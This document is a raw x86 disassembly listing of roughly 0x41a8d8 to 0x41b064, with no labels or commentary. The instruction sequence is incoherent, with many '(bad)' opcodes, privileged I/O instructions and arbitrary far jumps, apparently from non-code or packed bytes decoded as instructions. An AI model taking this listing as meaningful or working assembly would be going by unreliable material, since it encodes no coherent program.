  41a8d8:	mov    ds:0xa13f4834,eax
  41a8dd:	adc    eax,0x1df02ae1
  41a8e2:	sbb    BYTE PTR [edx+ecx*2],0x39
  41a8e6:	enter  0xb6,0x56
  41a8ea:	or     BYTE PTR [eax-0xa],0xbf
  41a8ee:	repnz or DWORD PTR [ebx+0x874fff9],eax
  41a8f5:	cmp    DWORD PTR [ecx],eax
  41a8f7:	jne    0x41a8ee
  41a8f9:	and    ah,bh
  41a8fb:	cli    
  41a8fc:	jge    0x41a8d2
  41a8fe:	and    DWORD PTR [edi-0x42],ebp
  41a901:	xor    BYTE PTR [esi+eax*2-0x74ab9df8],bh
  41a908:	pop    esi
  41a909:	(bad)  
  41a90a:	xor    BYTE PTR [eax],al
  41a90c:	aam    0x78
  41a90e:	add    BYTE PTR fs:[ebp-0x6a88f7c7],0x26
  41a916:	xchg   BYTE PTR [ebx],bl
  41a918:	dec    ebx
  41a919:	mov    DWORD PTR [esi],esi
  41a91b:	jnp    0x41a94c
  41a91d:	mov    ebp,0xd84424b5
  41a922:	cmp    BYTE PTR [edi+0x3],dl
  41a925:	call   DWORD PTR [ebp-0x8]
  41a928:	xor    al,0xe0
  41a92a:	adc    BYTE PTR [edi],0x61
  41a92d:	jg     0x41a914
  41a92f:	adc    eax,0x8e8714eb
  41a934:	shr    BYTE PTR [ecx],1
  41a936:	sbb    ebx,DWORD PTR [esi+0x29]
  41a939:	sub    al,0x9
  41a93b:	pop    esp
  41a93c:	adc    edx,DWORD PTR [ebp-0x202cd1ba]
  41a942:	mov    edi,0x5cb03047
  41a947:	jp     0x41a911
  41a949:	xor    ecx,esp
  41a94b:	cmc    
  41a94c:	cmp    esi,ebx
  41a94e:	push   0xfbfb1f90
  41a953:	fadd   DWORD PTR [eax+ebx*8]
  41a956:	(bad)  
  41a957:	inc    ebx
  41a958:	mov    DWORD PTR [edi+0xc],ebx
  41a95b:	fistp  QWORD PTR [ebx]
  41a95d:	repz jg 0x41a946
  41a960:	inc    edx
  41a961:	mov    ds:0x5c703d3,al
  41a966:	adc    eax,0xd4fcea68
  41a96b:	out    0x69,eax
  41a96d:	adc    bl,BYTE PTR [eax]
  41a96f:	jo     0x41a914
  41a971:	cmp    BYTE PTR [ecx+0x78326d3c],ah
  41a977:	add    DWORD PTR [eax+0x15],esp
  41a97a:	inc    eax
  41a97b:	pminsw mm4,QWORD PTR [ebx-0x16e44ad4]
  41a982:	fistp  QWORD PTR [edx]
  41a984:	jb     0x41a9ae
  41a986:	in     al,0xc6
  41a988:	add    eax,0x9c9fac34
  41a98d:	ret    
  41a98e:	mov    cs,WORD PTR [eax-0x45d11641]
  41a994:	mov    edi,DWORD PTR [eax+ebx*1]
  41a997:	lea    esi,[eax+ebx*1+0x4]
  41a99b:	call   0x180b:0xbffea116
  41a9a2:	sbb    BYTE PTR [ecx],al
  41a9a4:	fidiv  DWORD PTR [esi]
  41a9a6:	inc    esi
  41a9a7:	mov    WORD PTR [ebx+0x754f08c6],es
  41a9ad:	jmp    0x41aa0d
  41a9af:	pop    edi
  41a9b0:	shr    DWORD PTR [bp-0x48],cl
  41a9b4:	fimul  DWORD PTR [edi+0x3]
  41a9b7:	call   0xe30c:0x4c1a0489
  41a9be:	int    0xe
  41a9c0:	dec    edx
  41a9c1:	in     al,dx
  41a9c2:	retf   
  41a9c3:	push   0x8b10b150
  41a9c8:	sbb    eax,0x963800ff
  41a9cd:	dec    esi
  41a9ce:	cwde   
  41a9cf:	mov    edi,0xfff799de
  41a9d4:	add    dl,0x30
  41a9d7:	jl     0x41a97d
  41a9d9:	mov    ebp,0x88c1784b
  41a9de:	adc    al,0x6
  41a9e0:	es mov ebx,0x49d88bfb
  41a9e6:	push   es
  41a9e7:	jne    0x41aa48
  41a9e9:	or     DWORD PTR [eax-0x5ee34e25],esp
  41a9ef:	add    al,0x57
  41a9f1:	rol    BYTE PTR [eax+0xc],1
  41a9f4:	push   0x7f
  41a9f6:	jmp    0xccca3c85
  41a9fb:	fisttp DWORD PTR [edx+0x3e1e52d9]
  41aa01:	jbe    0x41aa1f
  41aa03:	mov    ds:0xe61240cb,al
  41aa08:	lahf   
  41aa09:	sub    al,BYTE PTR [edi-0x798ff4fb]
  41aa0f:	out    dx,eax
  41aa10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa11:	neg    eax
  41aa13:	sbb    eax,eax
  41aa15:	inc    eax
  41aa16:	mov    bh,0x5f
  41aa18:	sbb    BYTE PTR [esi],bh
  41aa1a:	adc    al,0xff
  41aa1c:	in     eax,dx
  41aa1d:	inc    edx
  41aa1e:	pop    ss
  41aa1f:	fnstenv [edi+0x1c]
  41aa22:	add    al,0x34
  41aa24:	aaa    
  41aa25:	mov    ecx,0x58a5d00b
  41aa2a:	leave  
  41aa2b:	mov    bh,0x52
  41aa2d:	ror    DWORD PTR [edi+edi*8+0x51],1
  41aa31:	sahf   
  41aa32:	inc    esp
  41aa33:	jns    0x41aa8c
  41aa35:	and    ax,0xa49b
  41aa3a:	sar    BYTE PTR ds:0x14801818,cl
  41aa40:	cmp    DWORD PTR ds:0xa2ba6220,0xffffff95
  41aa47:	ds aam 0xb
  41aa4a:	mov    eax,0xa30843c
  41aa4f:	mov    ds:0xa2247e0d,eax
  41aa54:	loope  0x41aac0
  41aa56:	push   ds
  41aa57:	push   0xf3f56a75
  41aa5c:	and    DWORD PTR [edi],edi
  41aa5e:	in     al,dx
  41aa5f:	push   ecx
  41aa60:	pop    esp
  41aa61:	(bad)  
  41aa62:	jl     0x41aa99
  41aa64:	add    ch,BYTE PTR [eax-0x50]
  41aa67:	cmp    eax,DWORD PTR [eax+0xe]
  41aa6a:	sbb    BYTE PTR [ebx+0x3b],ch
  41aa6d:	pop    edx
  41aa6e:	ret    
  41aa6f:	mov    esi,0x4669502c
  41aa74:	into   
  41aa75:	dec    esp
  41aa76:	aaa    
  41aa77:	mov    ebx,0x7d1260
  41aa7c:	cmp    edx,DWORD PTR [eax+edi*4+0x78300d00]
  41aa83:	push   ss
  41aa84:	enter  0xda0d,0xd9
  41aa88:	push   ecx
  41aa89:	jo     0x41aa86
  41aa8b:	pusha  
  41aa8c:	cmp    DWORD PTR [ebx+0x2640be67],0xffffff80
  41aa93:	jnp    0x41aabd
  41aa95:	ins    BYTE PTR es:[edi],dx
  41aa96:	push   ss
  41aa97:	cmp    DWORD PTR [esi],0x1b
  41aa9a:	and    esi,eax
  41aa9c:	add    esi,esp
  41aa9e:	push   es
  41aa9f:	cmp    BYTE PTR [eax+0x6],dh
  41aaa2:	jmp    DWORD PTR [eax]
  41aaa4:	js     0x41aaaa
  41aaa6:	inc    esp
  41aaa7:	clc    
  41aaa8:	in     al,0xef
  41aaaa:	inc    edx
  41aaab:	jae    0x41aa9c
  41aaad:	jge    0x41aa96
  41aaaf:	sbb    DWORD PTR [edx],esi
  41aab1:	mov    gs,WORD PTR [edx]
  41aab3:	cwde   
  41aab4:	or     BYTE PTR [ebx],ch
  41aab6:	cmp    al,0xa3
  41aab8:	daa    
  41aab9:	push   0xffffffc7
  41aabb:	dec    edi
  41aabc:	mov    ebp,0xe7502f6
  41aac1:	ds add bl,ch
  41aac4:	mov    ds:0x76250c43,al
  41aac9:	adc    BYTE PTR [ebx+0x760130df],dl
  41aacf:	or     DWORD PTR [edx+0x7b],edx
  41aad2:	adc    cl,dh
  41aad4:	push   es
  41aad5:	inc    edx
  41aad6:	and    DWORD PTR [esp+ebx*1],esi
  41aad9:	cmc    
  41aada:	inc    ecx
  41aadb:	or     BYTE PTR [ebx-0x3b07ca95],0x5f
  41aae2:	push   ss
  41aae3:	jne    0x41aaf5
  41aae5:	cmp    esi,DWORD PTR [ebp+0x4]
  41aae8:	je     0x41aaf4
  41aaea:	push   esi
  41aaeb:	push   esi
  41aaec:	cmp    eax,0xb4b9daac
  41aaf1:	shr    BYTE PTR [ebp+0x4],cl
  41aaf4:	jne    0x41aaf9
  41aaf6:	mov    dl,BYTE PTR [eax]
  41aaf8:	fiadd  WORD PTR ds:0x5448e297
  41aafe:	hlt    
  41aaff:	out    dx,al
  41ab00:	sahf   
  41ab01:	adc    BYTE PTR [edi],al
  41ab03:	scas   al,BYTE PTR es:[edi]
  41ab04:	pop    ebx
  41ab05:	sub    bl,ch
  41ab07:	adc    DWORD PTR [ecx-0x792e1651],esp
  41ab0d:	outs   dx,BYTE PTR ds:[esi]
  41ab0e:	loope  0x41aa9c
  41ab10:	mov    eax,DWORD PTR [ebx]
  41ab12:	and    bl,bh
  41ab14:	shl    DWORD PTR [esi],cl
  41ab16:	or     eax,0x2be22fdc
  41ab1b:	cmc    
  41ab1c:	sub    eax,0xb05745a3
  41ab21:	adc    al,0x54
  41ab23:	ds cmc 
  41ab25:	ret    
  41ab26:	nop
  41ab27:	pop    DWORD PTR ds:0x128be9d6
  41ab2d:	sar    BYTE PTR [edi-0x3828a803],cl
  41ab33:	pop    esp
  41ab34:	ror    BYTE PTR [edx-0x8],0x49
  41ab38:	jl     0x41ab4a
  41ab3a:	lock dec DWORD PTR [esi*2+0x428d500a]
  41ab42:	clc    
  41ab43:	(bad)  
  41ab44:	push   eax
  41ab45:	rcr    DWORD PTR [ecx],0x87
  41ab48:	push   ss
  41ab49:	dec    edi
  41ab4a:	in     al,dx
  41ab4b:	jb     0x41ab15
  41ab4d:	out    dx,eax
  41ab4e:	(bad)  
  41ab4f:	mov    edx,DWORD PTR [ebx]
  41ab51:	push   edx
  41ab52:	sbb    al,bh
  41ab54:	add    ecx,DWORD PTR [esi]
  41ab56:	or     BYTE PTR [ecx-0x3c],dl
  41ab59:	pop    ebx
  41ab5a:	pop    ss
  41ab5b:	and    ebx,edx
  41ab5d:	dec    esi
  41ab5e:	jne    0x41ab3a
  41ab60:	outs   dx,BYTE PTR ds:[esi]
  41ab61:	add    edx,DWORD PTR [edx+eiz*8]
  41ab64:	idiv   DWORD PTR [esi+0x42]
  41ab67:	inc    ecx
  41ab68:	jg     0x41ab84
  41ab6a:	or     BYTE PTR [edx+0x31],al
  41ab6d:	in     al,dx
  41ab6e:	lods   eax,DWORD PTR ds:[esi]
  41ab6f:	mov    ch,0x7d
  41ab71:	sub    eax,0x58c2896c
  41ab76:	push   ss
  41ab77:	dec    eax
  41ab78:	cld    
  41ab79:	cdq    
  41ab7a:	pop    edx
  41ab7b:	pop    eax
  41ab7c:	jmp    0x41ab82
  41ab7e:	jbe    0x41ab72
  41ab80:	add    eax,0x876cd758
  41ab85:	not    DWORD PTR [edi+edx*4]
  41ab88:	xchg   DWORD PTR [edx],ecx
  41ab8a:	call   DWORD PTR [edi]
  41ab8c:	inc    edx
  41ab8d:	lods   eax,DWORD PTR ds:[esi]
  41ab8e:	jle    0x41abe3
  41ab90:	out    0xc0,al
  41ab92:	jle    0x41abb8
  41ab94:	push   eax
  41ab95:	add    eax,0xa
  41ab98:	pop    ss
  41ab99:	icebp  
  41ab9a:	mov    ebp,0xfee083f1
  41ab9f:	push   eax
  41aba0:	sub    ebx,DWORD PTR [edx+0x66]
  41aba3:	mov    DWORD PTR [edx+eax*1+0x72],0x37c0281e
  41abab:	or     BYTE PTR es:[edx-0x77],bl
  41abaf:	push   eax
  41abb0:	cld    
  41abb1:	xor    al,0xf8
  41abb3:	jne    0x41abad
  41abb5:	shl    DWORD PTR [ebx-0x6770c1bc],0x89
  41abbc:	iret   
  41abbd:	mov    eax,edi
  41abbf:	rol    DWORD PTR [edx-0x6d0d879],0x89
  41abc6:	(bad)  
  41abc7:	jmp    0x5739:0xf0893e09
  41abce:	mov    ds:0x689eb3f,al
  41abd3:	sub    al,0xa8
  41abd5:	mov    DWORD PTR [ebx],edi
  41abd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd8:	push   esi
  41abd9:	fsub   st(6),st
  41abdb:	cli    
  41abdc:	mov    BYTE PTR [esi+0x52],ah
  41abdf:	push   eax
  41abe0:	push   es
  41abe1:	or     BYTE PTR [eax+0x51],dl
  41abe4:	adc    BYTE PTR [ecx+0xb4265b8],ah
  41abea:	dec    esp
  41abeb:	sub    ecx,ecx
  41abed:	sub    al,0x44
  41abef:	fsub   DWORD PTR [ebx-0x47]
  41abf2:	ficom  DWORD PTR [esi]
  41abf4:	aaa    
  41abf5:	or     al,0xa7
  41abf7:	add    esp,0x382ae851
  41abfd:	cmp    bh,0x3a
  41ac00:	les    eax,FWORD PTR [edx-0x7448020f]
  41ac06:	in     eax,dx
  41ac07:	xchg   al,bh
  41ac09:	fdivr  DWORD PTR [edi+0x9]
  41ac0c:	icebp  
  41ac0d:	(bad)  
  41ac0e:	jmp    0x41ac6f
  41ac10:	lea    ebp,[esi+0x1]
  41ac13:	cmp    ebp,0xf01e07ff
  41ac19:	ret    0x2642
  41ac1c:	sub    BYTE PTR [esi+0x2a],dl
  41ac1f:	(bad)  
  41ac20:	mov    edx,0x20f068c7
  41ac25:	hlt    
  41ac26:	aaa    
  41ac27:	enter  0x7cce,0xfd
  41ac2b:	fstp   QWORD PTR ds:0xc77b0f89
  41ac31:	mov    ecx,ebx
  41ac33:	and    eax,0x8b2ceb98
  41ac38:	fld    QWORD PTR [ebx]
  41ac3a:	fcomi  st,st(6)
  41ac3c:	pop    esp
  41ac3d:	aad    0xe7
  41ac3f:	sbb    al,0xd3
  41ac41:	xor    dl,BYTE PTR [edx+ebx*8]
  41ac44:	pop    es
  41ac45:	sbb    ebx,DWORD PTR gs:[edi-0x78]
  41ac49:	or     DWORD PTR [ebx+0x7b],0x3d33027d
  41ac50:	clc    
  41ac51:	aam    0x83
  41ac53:	sahf   
  41ac54:	ret    
  41ac55:	pop    edi
  41ac56:	call   DWORD PTR [edx-0x77]
  41ac59:	loop   0x41ac14
  41ac5b:	or     DWORD PTR [ebx-0x176432],ecx
  41ac61:	popa   
  41ac62:	xor    ecx,ecx
  41ac64:	mov    ds:0xa3a5221,al
  41ac69:	je     0x41ac82
  41ac6b:	cmp    cl,BYTE PTR [edx+0x1]
  41ac6e:	xchg   esi,eax
  41ac6f:	or     BYTE PTR [edx],al
  41ac71:	je     0x41ac2a
  41ac73:	or     edi,DWORD PTR [edx]
  41ac75:	call   0xeb74:0x83ca030b
  41ac7c:	call   0xd1caacc3
  41ac81:	pop    edx
  41ac82:	mov    ch,0x7f
  41ac84:	push   cs
  41ac85:	out    dx,al
  41ac86:	sub    ecx,edx
  41ac88:	jmp    0x2da173ea
  41ac8d:	push   edx
  41ac8e:	cmp    sp,WORD PTR [eax+0x20]
  41ac92:	jbe    0x41ac8b
  41ac94:	cld    
  41ac95:	sahf   
  41ac96:	or     BYTE PTR [eax+0x17],bl
  41ac99:	or     al,BYTE PTR [esp+esi*2]
  41ac9c:	push   cs
  41ac9d:	push   es
  41ac9e:	addr16 or bl,ch
  41aca1:	in     al,0x8
  41aca3:	(bad)  
  41aca4:	jl     0x41ac9c
  41aca6:	mov    dl,0x2
  41aca8:	add    eax,0x2e767473
  41acad:	add    al,0x8a
  41acaf:	or     al,BYTE PTR [edx-0x2c]
  41acb2:	mov    cl,BYTE PTR ds:0x57909367
  41acb8:	push   eax
  41acb9:	mov    edi,edx
  41acbb:	adc    dl,dh
  41acbd:	scas   al,BYTE PTR es:[edi]
  41acbe:	push   ebp
  41acbf:	jl     0x41ac9a
  41acc1:	out    dx,eax
  41acc2:	sbb    cl,dl
  41acc4:	pop    eax
  41acc5:	add    ecx,eax
  41acc7:	pop    eax
  41acc8:	pop    edi
  41acc9:	xor    DWORD PTR [edi-0x21033dfb],edi
  41accf:	inc    ebp
  41acd0:	or     ch,BYTE PTR [edi+ebp*2-0x3bf65d4]
  41acd7:	ret    
  41acd8:	xor    bh,BYTE PTR [edi]
  41acda:	sub    ebx,DWORD PTR [edx]
  41acdc:	jle    0x41acde
  41acde:	fimul  WORD PTR [edi]
  41ace0:	test   BYTE PTR [edx+0x1c83ff58],ah
  41ace6:	or     BYTE PTR [esi-0x3d],bh
  41ace9:	mov    edi,DWORD PTR [ecx-0x5e]
  41acec:	push   esi
  41aced:	cld    
  41acee:	add    edx,edi
  41acf0:	cmp    esi,ecx
  41acf2:	adc    al,0xd9
  41acf4:	push   es
  41acf5:	pop    ss
  41acf6:	(bad)  
  41acf7:	push   esi
  41acf8:	jle    0x41ac85
  41acfa:	dec    esi
  41acfb:	and    al,0x13
  41acfd:	and    cl,BYTE PTR [ebp-0x655f6219]
  41ad03:	js     0x41ad32
  41ad05:	call   0x61c94c03
  41ad0a:	adc    al,BYTE PTR [edx+0x608374ff]
  41ad10:	cmp    edx,DWORD PTR [eax]
  41ad12:	je     0x41ad70
  41ad14:	cmp    ecx,DWORD PTR [eax]
  41ad16:	jbe    0x41acdd
  41ad18:	frstor [edi]
  41ad1a:	fidivr DWORD PTR [edi+0x2c]
  41ad1d:	cld    
  41ad1e:	sbb    al,0xe2
  41ad20:	das    
  41ad21:	dec    esp
  41ad22:	scas   eax,DWORD PTR es:[edi]
  41ad23:	ror    DWORD PTR [ecx-0x74376732],cl
  41ad29:	cs jp  0x41ad6f
  41ad2c:	cld    
  41ad2d:	add    eax,DWORD PTR [esi+0x69]
  41ad30:	(bad)  
  41ad31:	ins    BYTE PTR es:[edi],dx
  41ad32:	mov    eax,ebx
  41ad34:	mov    ecx,DWORD PTR [ebx-0x4b]
  41ad37:	mov    dl,0xd9
  41ad39:	out    dx,eax
  41ad3a:	mov    edx,edi
  41ad3c:	lds    eax,FWORD PTR [ebx]
  41ad3e:	push   ebx
  41ad3f:	sbb    eax,0x96881e58
  41ad44:	fstp   st(5)
  41ad46:	pop    ebx
  41ad47:	cmp    cl,BYTE PTR [edi-0x8]
  41ad4a:	mov    esp,ecx
  41ad4c:	mov    edx,ecx
  41ad4e:	jmp    0x570c36f4
  41ad53:	ins    BYTE PTR es:[edi],dx
  41ad54:	mov    es,WORD PTR [ebx]
  41ad56:	(bad)  
  41ad57:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41ad59:	xor    edi,edi
  41ad5b:	inc    esi
  41ad5c:	xchg   esp,eax
  41ad5d:	adc    al,0xef
  41ad5f:	adc    BYTE PTR [eax+0x13],ch
  41ad62:	cwde   
  41ad63:	or     al,0x39
  41ad65:	mov    esp,0xfc418bf2
  41ad6a:	dec    edx
  41ad6b:	sbb    DWORD PTR [esi+0x2ebc337],esi
  41ad71:	push   es
  41ad72:	sub    ecx,DWORD PTR [ecx]
  41ad74:	add    ebx,DWORD PTR [esi]
  41ad76:	cmp    edi,ecx
  41ad78:	sbb    al,0x78
  41ad7a:	add    eax,0x4a4cbbd8
  41ad7f:	jne    0x41ad6d
  41ad81:	mov    ds:0x7728e617,al
  41ad86:	cld    
  41ad87:	inc    ebx
  41ad88:	paddd  mm4,QWORD PTR [edi]
  41ad8b:	jge    0x41adc9
  41ad8d:	and    al,0xff
  41ad8f:	aaa    
  41ad90:	add    esi,DWORD PTR [edi]
  41ad92:	dec    ebx
  41ad93:	jmp    0x41ad9d
  41ad95:	and    edx,DWORD PTR [eax+0x7]
  41ad98:	lahf   
  41ad99:	push   ds
  41ad9a:	mov    esi,0x189c445e
  41ad9f:	mov    edx,esi
  41ada1:	or     bl,BYTE PTR ss:[esi+0x617ce01]
  41ada8:	lds    eax,FWORD PTR [eax+eiz*8-0x75168ab5]
  41adaf:	dec    esi
  41adb0:	or     al,0xcc
  41adb2:	icebp  
  41adb3:	cmovbe ecx,DWORD PTR [edx]
  41adb6:	and    cl,BYTE PTR [edx+0x5a]
  41adb9:	and    al,0x58
  41adbb:	lea    esp,[esp+edx*4]
  41adbe:	jmp    eax
  41adc0:	dec    ebx
  41adc1:	loope  0x41ae2a
  41adc3:	mov    ebp,0xd039d946
  41adc8:	push   edi
  41adc9:	dec    DWORD PTR [ebx]
  41adcb:	mov    esi,0xd668e4a3
  41add0:	imul   ecx,DWORD PTR [ebx-0x3a8742e],0x29
  41add7:	shl    BYTE PTR [edi+0x2],1
  41adda:	add    edx,eax
  41addc:	push   edx
  41addd:	sub    al,bh
  41addf:	jg     0x41ada6
  41ade1:	shr    edx,0xac
  41ade4:	mov    ecx,DWORD PTR es:[esi]
  41ade7:	mov    ebx,DWORD PTR [edi]
  41ade9:	cmp    ecx,ebx
  41adeb:	jne    0x41ae45
  41aded:	dec    edx
  41adee:	je     0x41ae05
  41adf0:	fadd   DWORD PTR [edx+eax*4]
  41adf3:	cmp    esi,eax
  41adf5:	pushf  
  41adf6:	mov    ah,0x18
  41adf8:	dec    ebx
  41adf9:	int3   
  41adfa:	add    edi,0x8
  41adfd:	ds mov edx,0xe2ed378e
  41ae03:	jmp    0x41ae0b
  41ae05:	adc    al,0x4
  41ae07:	add    al,0x5a
  41ae09:	and    edx,0x54
  41ae0c:	and    dl,BYTE PTR [edi+0x38]
  41ae0f:	data16 fdivr QWORD PTR [esi+0x38174169]
  41ae16:	std    
  41ae17:	jne    0x41ae53
  41ae19:	or     al,0x10
  41ae1b:	and    ebx,0x1bbfdf96
  41ae21:	adc    DWORD PTR [eax+0xa],ecx
  41ae24:	jo     0x41ae4d
  41ae26:	add    eax,eax
  41ae28:	jmp    0x41ae4d
  41ae2a:	shr    ebx,0xef
  41ae2d:	jg     0x41ae1e
  41ae2f:	mov    ebx,0x150cd41c
  41ae34:	pop    edx
  41ae35:	pusha  
  41ae36:	adc    BYTE PTR [edx+0xc],bl
  41ae39:	shr    ecx,0x10
  41ae3c:	shr    ebx,0x10
  41ae3f:	sbb    al,BYTE PTR [edx]
  41ae41:	cmc    
  41ae42:	sub    esp,DWORD PTR [ebp+0x32]
  41ae45:	xlat   BYTE PTR ds:[ebx]
  41ae46:	enter  0xc3,0xb8
  41ae4a:	cmp    eax,0x3995a571
  41ae4f:	lock sbb ah,bl
  41ae52:	cmp    BYTE PTR [edx+esi*1+0x53],dh
  41ae56:	mov    eax,0xde4ba45e
  41ae5b:	lea    ebx,[esi+0x22935013]
  41ae61:	xchg   ebp,eax
  41ae62:	mov    ecx,0x2510586c
  41ae67:	dec    eax
  41ae68:	inc    eax
  41ae69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6a:	int3   
  41ae6b:	lods   eax,DWORD PTR ds:[esi]
  41ae6c:	cmp    eax,DWORD PTR [esi]
  41ae6e:	pop    ebx
  41ae6f:	mov    eax,edx
  41ae71:	xchg   edi,eax
  41ae72:	xor    DWORD PTR [eax-0xbc400ff],esi
  41ae78:	sub    eax,0x6afc588b
  41ae7d:	es dec edx
  41ae7f:	jl     0x41ae9c
  41ae81:	cmp    edx,ebx
  41ae83:	jge    0x41aea4
  41ae85:	sub    ebx,edx
  41ae87:	or     BYTE PTR [eax],cl
  41ae89:	push   ss
  41ae8a:	adc    al,0x86
  41ae8c:	sbb    DWORD PTR [edx+0x7f],eax
  41ae8f:	adc    esi,ebp
  41ae91:	push   0xfffffffb
  41ae93:	jg     0x41ae5f
  41ae95:	repz mov eax,0xebd23111
  41ae9b:	in     eax,0x89
  41ae9d:	fldpi  
  41ae9f:	jmp    0x41aec6
  41aea1:	cmp    BYTE PTR [eax+0x23],bh
  41aea4:	mov    al,ds:0x7c8c5b44
  41aea9:	inc    eax
  41aeaa:	sbb    dh,BYTE PTR [ecx]
  41aeac:	mov    edi,esi
  41aeae:	(bad)  
  41aeaf:	outs   dx,DWORD PTR ds:[esi]
  41aeb0:	xchg   DWORD PTR [ebx-0xba803b1],ecx
  41aeb6:	dec    edx
  41aeb7:	js     0x41aed4
  41aeb9:	mov    al,BYTE PTR [esi]
  41aebb:	inc    esi
  41aebc:	sar    BYTE PTR [esi+0x14],1
  41aebf:	xor    DWORD PTR [eax],eax
  41aec1:	fiadd  WORD PTR [edi-0x68]
  41aec4:	adc    BYTE PTR [ecx-0x752ec735],cl
  41aeca:	mov    ebp,0xcc4f8a14
  41aecf:	sub    ah,0x5a
  41aed2:	mov    esi,0x50b4e064
  41aed7:	adc    BYTE PTR [esi+edi*8-0x8],dh
  41aedb:	jmp    0x7348:0xa013416f
  41aee2:	rcl    BYTE PTR [eax+ecx*2+0xbc368e],1
  41aee9:	aas    
  41aeea:	lods   al,BYTE PTR ds:[esi]
  41aeeb:	and    eax,DWORD PTR [ebx+0x1d753478]
  41aef1:	sub    eax,0xffffffbc
  41aef4:	ret    0x7009
  41aef7:	or     BYTE PTR ds:0x7fe0b62a,0xe0
  41aefe:	pop    eax
  41aeff:	ins    BYTE PTR es:[edi],dx
  41af00:	mov    DWORD PTR [edx-0x35a3b572],esp
  41af06:	jo     0x41af04
  41af08:	(bad)  
  41af09:	hlt    
  41af0a:	jmp    0x41aef8
  41af0c:	rcl    BYTE PTR [edi],1
  41af0e:	xor    al,0x7d
  41af10:	rcr    dh,1
  41af12:	arpl   ax,dx
  41af14:	cli    
  41af15:	clc    
  41af16:	cmp    ecx,esi
  41af18:	jl     0x41aee4
  41af1a:	icebp  
  41af1b:	jae    0x41af1e
  41af1d:	add    DWORD PTR [edx],eax
  41af1f:	pop    edi
  41af20:	int    0xc3
  41af22:	xchg   edi,eax
  41af23:	clc    
  41af24:	inc    esp
  41af25:	je     0x41af7c
  41af27:	push   eax
  41af28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af29:	cmp    al,0xba
  41af2b:	in     al,0x76
  41af2d:	add    BYTE PTR [ecx-0x6cf829f8],0x6
  41af34:	push   edx
  41af35:	mov    ebx,0x2feb80b4
  41af3a:	dec    esp
  41af3b:	pop    ds
  41af3c:	dec    DWORD PTR [esi]
  41af3e:	push   eax
  41af3f:	sub    eax,0x28580bbe
  41af44:	mov    bh,0xe7
  41af46:	in     eax,0xc
  41af48:	rol    BYTE PTR [edx],1
  41af4a:	out    dx,eax
  41af4b:	add    eax,0xcb3950e7
  41af50:	call   0x4b769a42
  41af55:	lahf   
  41af56:	jb     0x41af06
  41af58:	mov    esp,0x4ab1146b
  41af5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af5e:	adc    edi,DWORD PTR ds:0x44e5e051
  41af64:	jno    0x41aee6
  41af66:	cld    
  41af67:	mov    al,ds:0xa8320701
  41af6c:	jmp    0x41afcb
  41af6e:	call   DWORD PTR [edx-0x17f88d19]
  41af74:	jle    0x41afa9
  41af76:	xchg   esp,eax
  41af77:	jmp    0x41afa3
  41af79:	mov    ebx,ebp
  41af7b:	enter  0x9c80,0x1
  41af7f:	add    esi,DWORD PTR [eax+esi*8]
  41af82:	call   0x4e8ace36
  41af87:	xor    al,0xf0
  41af89:	mov    esi,0xcdff0cfe
  41af8e:	arpl   WORD PTR [eax],si
  41af90:	add    eax,0xcc2f504a
  41af95:	(bad)  
  41af96:	pop    edx
  41af97:	add    BYTE PTR [edx],0xcc
  41af9a:	lock push DWORD PTR [edx]
  41af9d:	mov    DWORD PTR [edx],eax
  41af9f:	and    edx,DWORD PTR [eax+0xc30ecf]
  41afa5:	inc    ecx
  41afa6:	sub    BYTE PTR [edi+0x3],al
  41afa9:	sbb    dl,BYTE PTR [esi]
  41afab:	mov    ch,0x9e
  41afad:	jmp    0xa:0x4870823
  41afb4:	mov    ds:0xe6a440e,al
  41afb9:	jo     0x41b01f
  41afbb:	mov    edi,0xc8e840c2
  41afc0:	jae    0x41b037
  41afc2:	mov    al,ds:0x1672741f
  41afc7:	push   ecx
  41afc8:	push   esp
  41afc9:	add    BYTE PTR [edx],dh
  41afcb:	and    BYTE PTR [edi+0x41],al
  41afce:	xor    al,0x3c
  41afd0:	ins    DWORD PTR es:[edi],dx
  41afd1:	push   esi
  41afd2:	xor    DWORD PTR [esi+0x66],0x661f0458
  41afd9:	call   0x327d58ff
  41afde:	repnz sbb eax,0x2f5a0f16
  41afe4:	or     DWORD PTR [ebx-0x7c],eax
  41afe7:	inc    ebp
  41afe8:	xchg   edi,eax
  41afe9:	jecxz  0x41afff
  41afeb:	pop    ds
  41afec:	jbe    0x41affc
  41afee:	mov    ebp,0xf9cc2789
  41aff3:	mov    esi,eax
  41aff5:	pop    edi
  41aff6:	xor    ah,bh
  41aff8:	adc    eax,edi
  41affa:	adc    al,0x83
  41affc:	sti    
  41affd:	add    DWORD PTR [ebp+0x14],edi
  41b000:	pop    es
  41b001:	dec    ebx
  41b002:	cmp    eax,ebx
  41b004:	nop
  41b005:	maskmovq mm4,(bad)
  41b006:	mul    DWORD PTR [ebx+0x1cff9c7b]
  41b00c:	xchg   edx,eax
  41b00d:	sub    eax,ebx
  41b00f:	cmp    edi,eax
  41b011:	push   ds
  41b012:	lods   al,BYTE PTR ds:[esi]
  41b013:	add    edi,DWORD PTR [eax-0x2d77d475]
  41b019:	push   0x4d
  41b01b:	or     BYTE PTR [ecx+0x70199015],dl
  41b021:	aas    
  41b022:	inc    esi
  41b023:	rcr    BYTE PTR [edi+0x51],cl
  41b026:	lea    ebx,[edx+0x7b]
  41b029:	jmp    0x3245:0x296289c2
  41b030:	or     BYTE PTR [eax-0x5110f545],0x6
  41b037:	mov    bl,0x48
  41b039:	adc    al,0x3b
  41b03b:	fadd   DWORD PTR [esi-0x74e5c2e3]
  41b041:	test   al,0x3
  41b043:	leave  
  41b044:	sahf   
  41b045:	push   es
  41b046:	jg     0x41afcf
  41b048:	mov    bl,0xd0
  41b04a:	popf   
  41b04b:	lock push ss
  41b04d:	push   edi
  41b04e:	cwde   
  41b04f:	cli    
  41b050:	(bad)  
  41b051:	js     0x41b054
  41b053:	out    dx,al
  41b054:	hlt    
  41b055:	push   ebx
  41b056:	mov    cl,BYTE PTR [edx+0x1]
  41b059:	push   ecx
  41b05a:	lea    esi,[ecx+edx*1-0x3e]
  41b05e:	jl     0x41b071
  41b060:	push   es
  41b061:	mov    edx,DWORD PTR [edi]
  41b063:	popa   
  41b064:	pop    ss
